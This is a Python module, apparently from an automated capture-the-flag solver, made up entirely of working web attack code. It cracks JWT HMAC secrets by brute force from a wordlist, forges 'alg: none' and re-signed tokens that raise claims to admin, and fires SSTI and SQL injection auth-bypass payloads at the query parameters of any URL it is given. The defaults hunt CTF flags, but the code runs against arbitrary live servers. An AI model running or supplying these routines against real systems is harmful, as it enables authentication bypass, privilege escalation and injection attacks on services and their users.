"""Web security solver: JWT vulnerability exploitation, algorithm none, HMAC secret cracking, and SSTI/SQLi probing."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import re
from typing import Any
import urllib.parse
import urllib.request

from ..flags import scan_text, scan_encoded


COMMON_JWT_SECRETS = [
    "secret", "jwt", "key", "password", "admin", "123456", "supersecret",
    "private", "token", "root", "guest", "test", "development", "production",
    "flag", "ctf", "auth", "session", "default", "master", "keyboard_cat"
]


def b64url_decode(s: str) -> bytes:
    """Decode base64url string with padding restoration."""
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * ((4 - len(s) % 4) % 4)
    return base64.b64decode(s)


def b64url_encode(b: bytes) -> str:
    """Encode bytes to base64url string without padding."""
    return base64.b64encode(b).decode("utf-8").replace("+", "-").replace("/", "_").rstrip("=")


def crack_jwt_secret(token: str, wordlist_path: str = "") -> str:
    """Brute force HMAC-SHA256 secret key."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return ""
    header_b64, payload_b64, sig_b64 = parts
    signing_input = f"{header_b64}.{payload_b64}".encode("utf-8")
    try:
        target_sig = b64url_decode(sig_b64)
    except Exception:
        return ""

    # Test top secrets list
    for sec in COMMON_JWT_SECRETS:
        calc_sig = hmac.new(sec.encode("utf-8"), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(calc_sig, target_sig):
            return sec

    # If rockyou is available and requested, test first 10,000 words
    if wordlist_path and os.path.exists(wordlist_path):
        try:
            with open(wordlist_path, "r", encoding="latin-1", errors="ignore") as fh:
                for idx, line in enumerate(fh):
                    if idx > 10000:
                        break
                    sec = line.strip()
                    calc_sig = hmac.new(sec.encode("utf-8"), signing_input, hashlib.sha256).digest()
                    if hmac.compare_digest(calc_sig, target_sig):
                        return sec
        except Exception:
            pass

    return ""


def forge_jwt_none(token: str, override_claims: dict[str, Any] | None = None) -> list[str]:
    """Generate algorithm 'none' forged tokens."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        return []

    try:
        hdr = json.loads(b64url_decode(parts[0]).decode("utf-8"))
        payload = json.loads(b64url_decode(parts[1]).decode("utf-8"))
    except Exception:
        return []

    if override_claims:
        payload.update(override_claims)
    else:
        # Default CTF escalations
        for k in ["role", "user", "username", "sub", "login", "identity"]:
            if k in payload:
                payload[k] = "admin"
        payload["admin"] = True
        payload["is_admin"] = True

    payload_bytes = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    payload_b64 = b64url_encode(payload_bytes)

    forged_tokens: list[str] = []
    # Test variants: 'none', 'None', 'NONE'
    for none_alg in ["none", "None", "NONE"]:
        hdr_copy = dict(hdr)
        hdr_copy["alg"] = none_alg
        hdr_bytes = json.dumps(hdr_copy, separators=(",", ":")).encode("utf-8")
        hdr_b64 = b64url_encode(hdr_bytes)
        forged_tokens.append(f"{hdr_b64}.{payload_b64}.")
        forged_tokens.append(f"{hdr_b64}.{payload_b64}")

    return forged_tokens


def forge_jwt_hmac(token: str, secret: str, override_claims: dict[str, Any] | None = None) -> str:
    """Forge a new token signed with a recovered HMAC secret."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        return ""
    try:
        hdr = json.loads(b64url_decode(parts[0]).decode("utf-8"))
        payload = json.loads(b64url_decode(parts[1]).decode("utf-8"))
    except Exception:
        return ""

    if override_claims:
        payload.update(override_claims)
    else:
        payload["admin"] = True
        payload["role"] = "admin"

    hdr["alg"] = "HS256"
    hdr_b64 = b64url_encode(json.dumps(hdr, separators=(",", ":")).encode("utf-8"))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{hdr_b64}.{payload_b64}".encode("utf-8")
    sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{hdr_b64}.{payload_b64}.{sig_b64}"


def attack_jwt(token: str) -> dict[str, Any]:
    """Run full automated attack on a discovered JWT token."""
    flags: list[dict[str, Any]] = []
    notes: list[str] = []

    # 1. Inspect claims for flags
    parts = token.strip().split(".")
    if len(parts) >= 2:
        try:
            hdr_str = b64url_decode(parts[0]).decode("utf-8", "replace")
            payload_str = b64url_decode(parts[1]).decode("utf-8", "replace")
            notes.append(f"Header: {hdr_str}")
            notes.append(f"Payload: {payload_str}")
            flags.extend(scan_text(payload_str))
            flags.extend(scan_text(hdr_str))
        except Exception:
            pass

    # 2. Try cracking HMAC secret
    secret = crack_jwt_secret(token, "/usr/share/wordlists/rockyou.txt")
    if secret:
        notes.append(f"[!] RECOVERED JWT SECRET: '{secret}'")
        forged_admin = forge_jwt_hmac(token, secret)
        notes.append(f"Forged admin token: {forged_admin}")
    else:
        # Generate alg: none bypass tokens
        none_tokens = forge_jwt_none(token)
        if none_tokens:
            notes.append(f"Alg:none token bypass generated: {none_tokens[0]}")

    return {
        "step": "jwt-exploit",
        "summary": "JWT analysis, secret cracking, and alg:none forge",
        "output": "\n".join(notes),
        "flags": flags,
    }


def probe_ssti_sqli(url: str, timeout: int = 5) -> dict[str, Any]:
    """Non-destructive fast probe for SSTI and SQLi vulnerabilities in URL parameters."""
    flags: list[dict[str, Any]] = []
    findings: list[str] = []

    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return {"step": "web-vuln-probe", "summary": "No query parameters to test", "output": "", "flags": []}

    qs = urllib.parse.parse_qs(parsed.query)

    # 1. SSTI Test: 7*7 -> 49, 1337*2 -> 2674
    ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
    for param in qs:
        orig_val = qs[param][0]
        for payload in ssti_payloads:
            test_qs = dict(qs)
            test_qs[param] = [payload]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "KRYPT/2.1"})
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    body = resp.read().decode("utf-8", "replace")
                    if "49" in body and payload not in body:
                        findings.append(f"[SSTI] Parameter '{param}' evaluated payload '{payload}' to '49'!")
                        flags.extend(scan_text(body))
                        break
            except Exception:
                pass

    # 2. SQLi Auth Bypass Test: ' OR '1'='1
    sqli_payloads = ["' OR '1'='1", "admin' --", "' OR 1=1--"]
    for param in qs:
        for payload in sqli_payloads:
            test_qs = dict(qs)
            test_qs[param] = [payload]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "KRYPT/2.1"})
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    body = resp.read().decode("utf-8", "replace")
                    body_flags = scan_text(body)
                    if body_flags:
                        findings.append(f"[SQLi] Flag revealed with SQL payload '{payload}' on parameter '{param}'!")
                        flags.extend(body_flags)
                        break
            except Exception:
                pass

    return {
        "step": "web-vuln-probe",
        "summary": f"SSTI/SQLi automated probes ({len(findings)} finding(s))",
        "output": "\n".join(findings) if findings else "No immediate SSTI or SQLi reflection found in query parameters.",
        "flags": flags,
    }
